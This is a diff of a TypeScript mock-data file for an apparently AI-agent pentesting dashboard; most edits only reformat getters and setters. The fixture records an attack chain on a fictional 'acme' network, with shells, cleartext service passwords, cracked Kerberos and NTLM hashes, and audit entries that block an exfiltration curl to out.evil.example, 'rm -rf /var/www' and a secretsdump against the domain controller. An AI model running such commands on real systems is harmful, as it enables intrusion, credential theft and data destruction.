-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2612"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2611");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2612");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 315,
@@ -2272,8 +3195,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg3",
     summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';",
-    get detail() { return swt("interface.m2613"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2613");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 317,
@@ -2281,8 +3208,12 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2614"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2614");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 88000,
     output_tokens: 5200,
     cache_read_tokens: 60000,
@@ -2296,8 +3227,12 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2615"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2615");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 321,
@@ -2318,8 +3253,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    get detail() { return swt("interface.m2616"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2616");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 323,
@@ -2340,10 +3279,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
-    get summary() { return swt("interface.m2617"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2618"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2617");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2618");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 325,
@@ -2351,8 +3298,12 @@ export const activity: Activity[] = [
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2619"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2619");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 64000,
     output_tokens: 4100,
     cache_read_tokens: 42000,
@@ -2366,8 +3317,12 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2620"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2620");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 331,
@@ -2377,8 +3332,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
-    get summary() { return swt("interface.m2621"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2621");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 332,
@@ -2389,8 +3348,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7a",
     summary: "LDAP Server started on 1389, HTTP on 8180",
-    get detail() { return swt("interface.m2622"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2622");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 333,
@@ -2411,10 +3374,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
-    get summary() { return swt("interface.m2623"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2624"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2623");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2624");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 335,
@@ -2424,8 +3395,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    get summary() { return swt("interface.m2625"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2625");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 336,
@@ -2436,8 +3411,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7c",
     summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
-    get detail() { return swt("interface.m2626"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2626");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 337,
@@ -2455,8 +3434,12 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2627"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2627");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2470,8 +3453,12 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:02:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2628"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2628");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 341,
@@ -2492,8 +3479,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8a",
     summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3",
-    get detail() { return swt("interface.m2629"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2629");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 343,
@@ -2514,8 +3505,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t8b",
     summary: "uid=0(root) gid=0(root) groups=0(root)",
-    get detail() { return swt("interface.m2630"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2630");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 345,
@@ -2533,8 +3528,12 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2631"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2631");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2548,8 +3547,12 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T20:32:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2632"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2632");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 351,
@@ -2570,8 +3573,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t9a",
     summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
-    get detail() { return swt("interface.m2633"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2633");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 353,
@@ -2579,8 +3586,12 @@ export const activity: Activity[] = [
     intent_id: "i9",
     ts: T("2026-07-25T21:00:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2634"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2634");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 82000,
     output_tokens: 5100,
     cache_read_tokens: 56000,
@@ -2594,8 +3605,12 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2635"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2635");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 361,
@@ -2615,10 +3630,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
-    get summary() { return swt("interface.m2636"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2637"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2636");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2637");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 363,
@@ -2626,8 +3649,12 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2638"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2638");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // work#11, i11: unauthenticated Jenkins RCE, done.
@@ -2637,8 +3664,12 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:32:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2639"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2639");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 371,
@@ -2659,8 +3690,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11a",
     summary: "200",
-    get detail() { return swt("interface.m2640"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2640");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 373,
@@ -2681,8 +3716,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11b",
     summary: "nt authority\\system",
-    get detail() { return swt("interface.m2641"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2641");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 375,
@@ -2692,8 +3731,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11c",
-    get summary() { return swt("interface.m2642"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2642");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 376,
@@ -2704,8 +3747,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11c",
     summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
-    get detail() { return swt("interface.m2643"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2643");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 377,
@@ -2723,8 +3770,12 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:50:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2644"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2644");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 96000,
     output_tokens: 6200,
     cache_read_tokens: 64000,
@@ -2738,8 +3789,12 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2645"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2645");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 381,
@@ -2760,8 +3815,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
-    get detail() { return swt("interface.m2646"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2646");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 383,
@@ -2782,8 +3841,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    get detail() { return swt("interface.m2647"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2647");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 385,
@@ -2801,8 +3864,12 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2648"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2648");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 108000,
     output_tokens: 6800,
     cache_read_tokens: 72000,
@@ -2816,8 +3883,12 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-25T23:52:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2649"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2649");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 391,
@@ -2838,8 +3909,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "ACME\\Administrator\nACME\\svc_deploy",
-    get detail() { return swt("interface.m2650"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2650");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 393,
@@ -2860,8 +3935,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
-    get detail() { return swt("interface.m2651"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2651");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 395,
@@ -2882,8 +3961,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
-    get detail() { return swt("interface.m2652"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2652");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 397,
@@ -2901,8 +3984,12 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2653"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2653");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2910,67 +3997,125 @@ export const activity: Activity[] = [
   },
 
   // Main Agent human-in-the-loop conversation.
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", get summary() { return swt("interface.m2654"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 70,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:18:00Z"),
+    kind: "user",
+    get summary() {
+      return swt("interface.m2654");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 71,
     worker: "mainagent",
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
-    get summary() { return swt("interface.m2655"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2655");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", get summary() { return swt("interface.m2656"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 72,
+    worker: "mainagent",
+    ts: T("2026-07-26T03:52:00Z"),
+    kind: "user",
+    get summary() {
+      return swt("interface.m2656");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 73,
     worker: "mainagent",
     ts: T("2026-07-26T03:52:08Z"),
     kind: "text",
-    get summary() { return swt("interface.m2657"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2657");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 400,
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
-    get summary() { return swt("interface.m2658"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2658");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 401,
     worker: "mainagent",
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
-    get summary() { return swt("interface.m2659"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2659");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 402,
     worker: "mainagent",
     ts: T("2026-07-25T21:22:00Z"),
     kind: "user",
-    get summary() { return swt("interface.m2660"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2660");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 403,
     worker: "mainagent",
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
-    get summary() { return swt("interface.m2661"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2661");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", get summary() { return swt("interface.m2662"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 404,
+    worker: "mainagent",
+    ts: T("2026-07-26T00:22:00Z"),
+    kind: "user",
+    get summary() {
+      return swt("interface.m2662");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 405,
     worker: "mainagent",
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
-    get summary() { return swt("interface.m2663"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2663");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 ];
 
@@ -3135,8 +4280,12 @@ User-Agent: Skopos-worker/1.0
 Accept: application/json
 
 `,
-  get resp() { return swt("interface.m2664"); },
-    set resp(value: string) { Object.defineProperty(this, "resp", { value, writable: true, enumerable: true, configurable: true }); },
+  get resp() {
+    return swt("interface.m2664");
+  },
+  set resp(value: string) {
+    Object.defineProperty(this, "resp", { value, writable: true, enumerable: true, configurable: true });
+  },
 };
 
 // ── Security / Audit ─────────────────────────────────────────────────────────
@@ -3159,8 +4308,12 @@ export const audit: Audit = {
       ts: T("2026-07-26T02:10:00Z"),
       tool: "bash",
       action: "block",
-      get reason() { return swt("interface.m2665"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+      get reason() {
+        return swt("interface.m2665");
+      },
+      set reason(value: string) {
+        Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+      },
       command: "curl https://out.evil.example/exfil",
     },
     {
@@ -3173,8 +4326,12 @@ export const audit: Audit = {
       ts: T("2026-07-25T21:00:00Z"),
       tool: "bash",
       action: "block",
-      get reason() { return swt("interface.m2666"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+      get reason() {
+        return swt("interface.m2666");
+      },
+      set reason(value: string) {
+        Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+      },
       command: "rm -rf /var/www",
     },
     {
@@ -3206,16 +4363,24 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
-      get reason() { return swt("interface.m2667"); },
-    set reason(value: string) { Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true }); },
+      get reason() {
+        return swt("interface.m2667");
+      },
+      set reason(value: string) {
+        Object.defineProperty(this, "reason", { value, writable: true, enumerable: true, configurable: true });
+      },
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      get command() { return swt("interface.m2668"); },
-    set command(value: string) { Object.defineProperty(this, "command", { value, writable: true, enumerable: true, configurable: true }); },
+      get command() {
+        return swt("interface.m2668");
+      },
+      set command(value: string) {
+        Object.defineProperty(this, "command", { value, writable: true, enumerable: true, configurable: true });
+      },
     },
   ],
 };
@@ -3280,13 +4445,21 @@ export const agents: Agent[] = [
   {
     id: "1001",
     key: "retester",
-    get name() { return swt("interface.m2222"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2222");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     role: "assistant",
     builtin: false,
     enabled: true,
-    get description() { return swt("interface.m2669"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2669");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 0,
     mcp_count: 0,
     skill_count: 0,
@@ -3295,13 +4468,21 @@ export const agents: Agent[] = [
   {
     id: "1",
     key: "goals",
-    get name() { return swt("interface.m2670"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2670");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     role: "goals",
     builtin: true,
     enabled: true,
-    get description() { return swt("interface.m2671"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2671");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 8,
     mcp_count: 0,
     skill_count: 1,
@@ -3310,13 +4491,21 @@ export const agents: Agent[] = [
   {
     id: "2",
     key: "planner",
-    get name() { return swt("interface.m2672"); },
-    set name(value: string) { Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true }); },
+    get name() {
+      return swt("interface.m2672");
+    },
+    set name(value: string) {
+      Object.defineProperty(this, "name", { value, writable: true, enumerable: true, configurable: true });
+    },
     role: "planner",
     builtin: true,
     enabled: true,
-    get description() { return swt("interface.m2673"); },
-    set description(value: string) { Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true }); },
+    get description() {
+      return swt("interface.m2673");
+    },
+    set description(value: string) {
+      Object.defineProperty(this, "description", { value, writable: true, enumerable: true, configurable: true });
+    },
     max_turns: 0,
     mcp_count: 1,
     skill_count: 2,
@@ -3325,13 +4514,21 @@ export const agents: Agent[] = [
   {
     id: "3",
     key: "mainagent",
-    get name() { return swt("interface.m0694"); },
